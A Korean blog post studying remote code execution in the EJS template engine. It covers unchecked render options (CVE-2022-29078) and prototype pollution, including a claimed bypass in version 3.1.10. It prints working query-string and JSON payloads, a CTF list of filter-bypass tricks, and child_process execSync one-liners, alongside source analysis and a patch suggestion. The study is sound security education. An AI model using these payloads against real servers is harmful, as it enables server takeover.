---
title: Exploring EJS RCE
description: A study on EJS RCE
published: 2024-10-18
updated: 2024-10-18
tags:
  - Study
  - JavaScript
category: Study
draft: false
---

최근 EJS와 관련된 문제를 많이 풀다 보니, EJS RCE에 관한 글 하나는 작성해보고 싶어서 작성한다.

## Introduction

시작하기 앞서, EJS에서 RCE가 왜 발생하는지 알아보자.

대부분의 경우는 `EJS maintainer`의 문제가 아닌, 사용자에게 모든 권한을 넘겨준 개발자의 문제로 취약점이 발생한다. 솔직히 말해서 이 부분은 취약점이라고도 하기 애매하다. 지금의 EJS는 아래와 같은 코드를 사용하지 말라고 하기 때문이다.

```javascript
app.get('/', (req, res) => {
  res.render('index', req.query);
});
```

물론 위 코드를 사용하지 않고도, `EJS RCE`를 발생시킬 수 있는 방법이 있다. 심지어, 아래와 같은 코드에서도 `EJS RCE`가 발생한다.

```javascript
app.get('/', (req, res) => {
  res.render('index');
});
```

위 코드에서는 왜 `RCE`가 발생할까?라는 생각이 들 수 있다. JS는 `prototype`에 크게 의존하는 언어이다. 즉, `prototype`이 오염된다면, 이를 통해 `RCE`를 발생시킬 수 있다. 무려 `EJS@3.1.10`에서도 위 취약점이 발생한다.

## About EJS RCE Gadgets

### EJS RCE with end-users unfettered access

해당 취약점은 아래의 코드에서 발생한다.

```javascript
app.get('/', (req, res) => {
  res.render('index', req.query);
});
```

위 코드에서 사용자가 입력한 `req.query`를 그대로 `render`에 넘겨주는 것을 볼 수 있다. 물론, `req.query`가 아니더라도 사용자가 입력한 값을 타입 검증 없이 넘겨주는 것은 위험하다.

그럼, 페이로드들에 대해서 알아보자.

#### EJS < 3.1.7

```plaintext
http://localhost:3000/?id=2&settings[view options][outputFunctionName]=x;console.log('rce!!');x
```

#### EJS <= 3.1.10

```plaintext
http://localhost:3000/?id=2&settings[view options][client]=1&settings[view options][escapeFunction]=x;console.log('rce!!');x
```

### EJS RCE with prototype pollution

해당 취약점은 아래의 코드에서 발생한다. 물론, 인자로 아무것도 안 넘겨주는 경우도 발생한다.

```javascript
app.post('/a', (req, res) => {
  merge({}, req.body);
  res.render('index', { foo: 'bar' });
});
```

이 취약점은, `prototype pollution`을 통해 발생한다. 즉, `prototype pollution`이 `RCE`까지 연결될 수 있는 것이다. 또한, `prototype pollution`으로 발생하는 취약점은 `EJS@3.1.10`에서 한 번 패치가 됐지만, 간단한 우회 방법을 통해서 `EJS@3.1.10`에서도 발생한다.

그럼 페이로드들을 알아보자.

#### EJS < 3.1.10

```typescript
await r.post('/a', {
  constructor: {
    prototype: {
      client: 1,
      escapeFunction: `console.log;console.info("RCE!!!")`,
    },
  },
});
```

#### EJS <= 3.1.10

```typescript
await r.post('/a', {
  constructor: {
    prototype: {
      'view options': {
        client: 1,
        escapeFunction: `console.log;console.info("RCE!!!")`,
      },
    },
  },
});
```

> [!NOTE] > `Prototype Pollution`이 발생한다는 것 자체가 큰 취약점이다. `Prototype Pollution`이 발생한다면 사용하고 있는 라이브러리에 따라서, 큰 문제가 발생할 수 있다. _(Ex. `jsonwebtoken`을 사용 중이라면 `token`이 잘못 생성되게도 할 수 있다.)_

### EJS RCE In CTFs

CTF에서는 `EJS RCE`와 관련된 문제가 종종 출제된다. 그러나, 여러 필터링 방법, JS의 모듈(`CommonJS`, `ES Module`)에 따라서 공격 방법이 달라진다. 이때 사용할 수 있는 공격 방법을 알아보자.

#### Text filtering bypass

- this['proc' + 'cess']
- this[['proc', 'cess'].join('')]
- this['proc'.concat('cess')]
- this[\`${'proc'}cess\`]
- this[\`${'proc' + 'cess'}\`]
- this[\`proc${''}cess\`]
- String.fromCharCode(1)
- c='abcdefghijklmnopqrstuvwxyz';process[c[0]+c[1]]
- eval('proc' + 'ess')
- using [JSFuck](https://jsfuck.com/)
- using Unicode escape sequences (e.g., `\u0070\u0072\u006F\u0063\u0065\u0073\u0073` for `process`)
- replace, Function constructor, map, reduce, etc...

#### CommonJS

- process.mainModule.require('child_process').execSync('code to execute')

#### ES Module

- import('child_process').then(({ execSync }) => execSync('code to execute'))
- process.binding('fs').readFileUtf8('file to read',0,0)

## Why EJS RCE Occurs?

`EJS`에서 `RCE`가 발생하는 이유는 간단하다. `EJS`는 `JavaScript`를 사용하는 템플릿이기 때문이다.

먼저, 왜 `EJS`에서 `RCE`가 발생하는지 보다, 어떻게 `EJS`가 작동하는지를 알아보자.

`express`에서 `render`를 호출하면 `renderFile`이 호출된다.

```javascript
exports.renderFile = function () {
  var args = Array.prototype.slice.call(arguments);
  var filename = args.shift();
  var cb;
  var opts = { filename: filename };
  var data;
  var viewOpts;

  // Do we have a callback?
  if (typeof arguments[arguments.length - 1] == 'function') {
    cb = args.pop();
  }
  // Do we have data/opts?
  if (args.length) {
    // Should always have data obj
    data = args.shift();
    // Normal passed opts (data obj + opts obj)
    if (args.length) {
      // Use shallowCopy so we don't pollute passed in opts obj with new vals
      utils.shallowCopy(opts, args.pop());
    }
    // Special casing for Express (settings + opts-in-data)
    else {
      // Express 3 and 4
      if (data.settings) {
        // Pull a few things from known locations
        if (data.settings.views) {
          opts.views = data.settings.views;
        }
        if (data.settings['view cache']) {
          opts.cache = true;
        }
        // Undocumented after Express 2, but still usable, esp. for
        // items that are unsafe to be passed along with data, like `root`
        viewOpts = data.settings['view options']; // [!code highlight:4]
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
      }
      // Express 2 and lower, values set in app.locals, or people who just
      // want to pass options in their data. NOTE: These values will override
      // anything previously set in settings  or settings['view options']
      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
    }
    opts.filename = filename;
  } else {
    data = utils.createNullProtoObjWherePossible();
  }

  return tryHandleCache(opts, data, cb);
};
```

이 함수에서는 기본적으로 `express`에 받은 `argument`들을 처리한다는 것을 알 수 있다. 좀 보다보면 특이한걸 알 수 있는데, `data.settings['view options']`
가 있다면, 얜 따로 `opts`에 복사 해준다는 것이다. 참고로 이게 `EJS`에서 `RCE`를 발생시키는 **트리거** 역할을 한다고 볼 수 있다.
그리고 `tryHandleCache` -> `handleCache` -> `compile`을 통해서 템플릿을 생성하고, 컴파일한다.

템플릿은 `v3.1.10`에서 다음과 같이 생성된다.

```javascript
function Template(text, optsParam) {
  var opts = utils.hasOwnOnlyObject(optsParam); // [!code highlight:2]
  var options = utils.createNullProtoObjWherePossible();
  this.templateText = text;
  /** @type {string | null} */
  this.mode = null;
  this.truncate = false;
  this.currentLine = 1;
  this.source = '';
  options.client = opts.client || false;
  options.escapeFunction =
    opts.escape || opts.escapeFunction || utils.escapeXML;
  options.compileDebug = opts.compileDebug !== false;
  options.debug = !!opts.debug;
  options.filename = opts.filename;
  options.openDelimiter =
    opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
  options.closeDelimiter =
    opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
  options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
  options.strict = opts.strict || false;
  options.context = opts.context;
  options.cache = opts.cache || false;
  options.rmWhitespace = opts.rmWhitespace;
  options.root = opts.root;
  options.includer = opts.includer;
  options.outputFunctionName = opts.outputFunctionName;
  options.localsName =
    opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;
  options.views = opts.views;
  options.async = opts.async;
  options.destructuredLocals = opts.destructuredLocals;
  options.legacyInclude =
    typeof opts.legacyInclude != 'undefined' ? !!opts.legacyInclude : true;

  if (options.strict) {
    options._with = false;
  } else {
    options._with = typeof opts._with != 'undefined' ? opts._with : true;
  }

  this.opts = options;

  this.regex = this.createRegex();
}
```

기본적으로 `prototype`없이 `obj`를 생성해 `prototype pollution`을 통한 `RCE`를 방지하는 것을 알 수 있다.
그리고, `this.opts`에 `opts`에서 받은 인자를 저장하고 있다.

그다음으로 `compile` 함수의 일부분을 살펴보자. 생성된 템플릿을 함수로 만드는 부분이다.

```javascript
try {
  if (opts.async) {
    // Have to use generated function for this, since in envs without support,
    // it breaks in parsing
    try {
      ctor = new Function('return (async function(){}).constructor;')();
    } catch (e) {
      if (e instanceof SyntaxError) {
        throw new Error('This environment does not support async/await');
      } else {
        throw e;
      }
    }
  } else {
    ctor = Function;
  }
  fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
} catch (e) {
  // istanbul ignore else
  if (e instanceof SyntaxError) {
    if (opts.filename) {
      e.message += ' in ' + opts.filename;
    }
    e.message += ' while compiling ejs\n\n';
    e.message +=
      'If the above error is not helpful, you may want to try EJS-Lint:\n';
    e.message += 'https://github.com/RyanZim/EJS-Lint';
    if (!opts.async) {
      e.message += '\n';
      e.message +=
        'Or, if you meant to create an async function, pass `async: true` as an option.';
    }
  }
  throw e;
}

// Return a callable function which will execute the function
// created by the source-code, with the passed data as locals
// Adds a local `include` function which allows full recursive include
var returnedFn = opts.client
  ? fn
  : function anonymous(data) {
      var include = function (path, includeData) {
        var d = utils.shallowCopy(
          utils.createNullProtoObjWherePossible(),
          data,
        );
        if (includeData) {
          d = utils.shallowCopy(d, includeData);
        }
        return includeFile(path, opts)(d);
      };
      return fn.apply(opts.context, [
        data || utils.createNullProtoObjWherePossible(),
        escapeFn,
        include,
        rethrow,
      ]);
    };
if (opts.filename && typeof Object.defineProperty === 'function') {
  var filename = opts.filename;
  var basename = path.basename(filename, path.extname(filename));
  try {
    Object.defineProperty(returnedFn, 'name', {
      value: basename,
      writable: false,
      enumerable: false,
      configurable: true,
    });
  } catch (e) {
    /* ignore */
  }
}
return returnedFn;
```

코드를 보면 알겠지만, `eval`이 아닌 `Function`을 통해서 함수를 생성하고 있다.
그리고, `Function`을 통해 생성된 함수는 `opts.client`가 `true`라면 `fn`을 그대로 반환하고, `false`라면 `anonymous` 함수를 반환한다.

이후에는 대충 예상이 가니 넘어가겠다.

이제 버전별 왜 `RCE`가 발생하는지 알아보자.

### EJS RCE with end-users unfettered access

> [!NOTE]
> 모든 설명은 `req.query`를 아무 검증 없이 `res.render('index', req.query)`와 같은 형식으로 넘겨주는 것을 전제로 한다.

#### EJS < 3.1.7

`CVE-2022-29078`가 발급되어 있으며, [여기](#ejs--317)에서 사용된 페이로드를 확인할 수 있다.

먼저, `EJS`의 **3.1.6**과 **3.1.7**의 차이점을 알아보자.

```javascript
if (opts.outputFunctionName) {
  if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
    // [!code ++:3]
    throw new Error('outputFunctionName is not a valid JS identifier.');
  }
  prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
if (opts.localsName && !_JS_IDENTIFIER.test(opts.localsName)) {
  // [!code ++:3]
  throw new Error('localsName is not a valid JS identifier.');
}
if (opts.destructuredLocals && opts.destructuredLocals.length) {
  var destructuring = '  var __locals = (' + opts.localsName + ' || {}),\n';
  for (var i = 0; i < opts.destructuredLocals.length; i++) {
    var name = opts.destructuredLocals[i];
    if (!_JS_IDENTIFIER.test(name)) {
      // [!code ++:3]
      throw new Error(
        'destructuredLocals[' + i + '] is not a valid JS identifier.',
      );
    }
    if (i > 0) {
      destructuring += ',\n  ';
    }
    destructuring += name + ' = __locals.' + name;
  }
  prepended += destructuring + ';\n';
}
```

`v3.1.7`부터는 `v3.1.6`과는 다르게 `_JS_IDENTIFIER.test(name)`를 통해서 `opts.outputFunctionName`에 허용되지 않는 문자가 있다면, `Error`를 발생시킨다. 이를 통해 `RCE`를 **방지**한다.

그러나, `v3.1.6`이하 버전들에는 이러한 검증이 없기 때문에, 개발자가 의도하지 않는 방향으로, 공격자가 **악의적인** `ouputFunctionName`을 작성해 `'  var ' + opts.outputFunctionName + ' = __append;' + '\n';`이런 형식으로 `outputFunctionName`이 **템플릿에 삽입**되게 되면서 `RCE`가 발생한다.

#### EJS <= 3.1.10

`v3.1.7`부터는 `outputFunctionName`를 통한 `RCE`가 불가능해졌다. 그러나, `client`와 `escapeFunction`을 통한 `RCE`는 여전히 가능하다.

```javascript
if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
  if (opts.compileDebug) {
    src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
  }
}
```

코드를 보면 알 수 있든, `opts.client`가 `true`일 때, `escapeFn`을 `string`으로 바꾸어 `src`에 추가하는 것을 볼 수 있다.
`escapeFn`은 `opts.escapeFunction`을 가리킨다.

이를 통해 `RCE`를 발생시킬 수 있다.

### EJS RCE with prototype pollution

`EJS`는 `prototype pollution`을 통한 `RCE`를 방지하기 위해서, `prototype` 없이 `Object`를 생성한다. 그러나, 버전에 따라서 `prototype pollution`을 통한 `RCE`가 발생할 수 있다.

#### EJS < 3.1.10

`CVE-2024-33883`가 발급되어 있다. [여기](#ejs--317-1)에서 사용된 페이로드를 확인할 수 있다.

`v3.1.10`에서 `prototype pollution`을 통해서 `RCE`와 `DoS`를 막기 위해서 업데이트를 하며, 널리 알려진 것 같다. (본인 기준)

```javascript
function Template(text, opts) {  // [!code --:2]
	opts = opts || utils.createNullProtoObjWherePossible();
function Template(text, optsParam) { // [!code ++:2]
	var opts = utils.hasOwnOnlyObject(optsParam);
	var options = utils.createNullProtoObjWherePossible();
	this.templateText = text;
	/** @type {string | null} */
	this.mode = null;
	this.truncate = false;
	this.currentLine = 1;
	this.source = '';
	options.client = opts.client || false;
	options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
	options.compileDebug = opts.compileDebug !== false;
	options.debug = !!opts.debug;
	options.filename = opts.filename;
	options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
	options.closeDelimiter =
		opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
	options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
	options.strict = opts.strict || false;
	options.context = opts.context;
	options.cache = opts.cache || false;
	options.rmWhitespace = opts.rmWhitespace;
	options.root = opts.root;
	options.includer = opts.includer;
	options.outputFunctionName = opts.outputFunctionName;
	options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;
	options.views = opts.views;
	options.async = opts.async;
	options.destructuredLocals = opts.destructuredLocals;
	options.legacyInclude = typeof opts.legacyInclude != 'undefined' ? !!opts.legacyInclude : true;

	if (options.strict) {
		options._with = false;
	} else {
		options._with = typeof opts._with != 'undefined' ? opts._with : true;
	}

	this.opts = options;

	this.regex = this.createRegex();
}
```

코드를 보면 알 수 있든 `v3.1.7`에서도 기본적인 `prototype pollution`을 통한 `RCE`를 방지하고 있다.

그러나, 여전히 `prototype pollution`을 통한 `RCE`는 발생한다. `opts`가 있다면 `opts`를 그대로 사용했기 떄문이다. (`options`는 `prorotype`에 영향을 받지 않지만, `opts`는 여전히 받는다.)

그리고, `v3.1.10`에서는 `opts`를 `prototype pollution`을 통한 `RCE`를 방지하기 위해 `utils.hasOwnOnlyObject(optsParam)`을 통해 `prototype`을 걸러낸다.

#### EJS <= 3.1.10

[EJS < 3.1.10](#ejs--3110-2)을 보면 알 수 있듯, 기존에 취약했던 `prototype pollution`을 통한 `RCE`는 발생시킬 수 없다. 그러나, `v3.1.10`에서도 `prototype pollution`을 통한 `RCE`가 발생한다.

먼저 아래 코드를 봐보자.

```javascript title="lib/ejs.js (v3.1.10)" showLineNumbers startLineNumber=441
exports.renderFile = function () {
  var args = Array.prototype.slice.call(arguments);
  var filename = args.shift();
  var cb;
  var opts = { filename: filename };
  var data;
  var viewOpts;

  // Do we have a callback?
  if (typeof arguments[arguments.length - 1] == 'function') {
    cb = args.pop();
  }
  // Do we have data/opts?
  if (args.length) {
    // Should always have data obj
    data = args.shift();
    // Normal passed opts (data obj + opts obj)
    if (args.length) {
      // Use shallowCopy so we don't pollute passed in opts obj with new vals
      utils.shallowCopy(opts, args.pop());
    }
    // Special casing for Express (settings + opts-in-data)
    else {
      // Express 3 and 4
      if (data.settings) {
        // Pull a few things from known locations
        if (data.settings.views) {
          opts.views = data.settings.views;
        }
        if (data.settings['view cache']) {
          opts.cache = true;
        }
        // Undocumented after Express 2, but still usable, esp. for
        // items that are unsafe to be passed along with data, like `root`
        viewOpts = data.settings['view options'];
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
      }
      // Express 2 and lower, values set in app.locals, or people who just
      // want to pass options in their data. NOTE: These values will override
      // anything previously set in settings  or settings['view options']
      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
    }
    opts.filename = filename;
  } else {
    data = utils.createNullProtoObjWherePossible();
  }

  return tryHandleCache(opts, data, cb);
};
```

만약 `viewOpts`가 오염되어 있다면 어떻게 될까? `viewOpts`의 내용이 `opts`에 복사되기 때문에(`prototype` 형식이 아닌 `obj`로 복사됨), `viewOpts`가 오염되어 있다면 `opts`도 오염된다.
이를 통해서 `prototype pollution`을 통한 `RCE`가 발생한다.

또한 간단하게 패치가 가능하다. `viewOpts = utils.hasOwnOnlyObject(data.settings['view options'])`으로 수정하면 된다. (물론 다른 방법으로 우회가 가능할 수도 있다.)

## Conclusion

`JavaScript`로 개발할때는 `prorotype pollution`이 발생하지 않도록 주의하자 :D
